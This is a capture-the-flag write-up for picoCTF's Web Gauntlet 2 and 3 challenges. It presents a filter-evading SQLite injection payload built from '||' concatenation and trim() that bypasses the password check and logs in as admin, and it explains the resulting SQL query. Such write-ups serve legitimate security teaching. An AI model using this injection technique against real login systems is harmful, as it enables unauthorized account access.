<hr />

<h2>description: Filtered SQLite injection</h2>

<h1>Web Gauntlet (170 + 300)</h1>

<h2>Problem</h2>

<h3>Web Gauntlet 2</h3>

<p>This website looks familiar... Log in as admin </p>

<p>Site: <a href="http://mercury.picoctf.net:35178/">http://mercury.picoctf.net:35178/</a> </p>

<p>Filter: <a href="http://mercury.picoctf.net:35178/filter.php">http://mercury.picoctf.net:35178/filter.php</a></p>

<h3>Web Gauntlet 3</h3>

<p>Last time, I promise! Only 25 characters this time.</p>

<h2>Solution</h2>

<h3>Web Gauntlet 2</h3>

<p>Username: <code>adm' || trim('in',</code> Password: <code>) || '</code></p>

<p>This will cause the following SQL statement to be executed:</p>

<p><code>text
SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''
</code></p>

<p>Notes:</p>

<ul>
<li><code>||</code> is the SQLite concatenation operator.</li>
<li><code>trim(string, character)</code> will remove <code>character</code> from <code>string</code>. Here, it is simply for us to ignore the <code>AND</code> condition by treating <code>' AND password='</code> as a string. Since <code>' AND password='</code> does not appear in <code>'in'</code>, <code>trim('in',' AND password=')</code> will simply return <code>'in'</code>.</li>
<li>The above SQL statement is thus equivalent to: </li>
</ul>

<p><code>text
SELECT username, password FROM users WHERE username='adm' || 'in' || ''
</code></p>

<p>Which is equivalent to:</p>

<p><code>text
SELECT username, password FROM users WHERE username='admin'
</code></p>

<p>We can now check out the filter page:</p>

<p><img src="../../.gitbook/assets/cfd745ed128d4fdea484d02e74f76170.png" alt="" /></p>

<h3>Web Gauntlet 3</h3>

<p>The length requirement is down from 35 characters to 25 characters. Our above solution works for this challenge as well!</p>

<p><img src="../../.gitbook/assets/961bccf829724357b9ee05d27beec0fb.png" alt="" /></p>
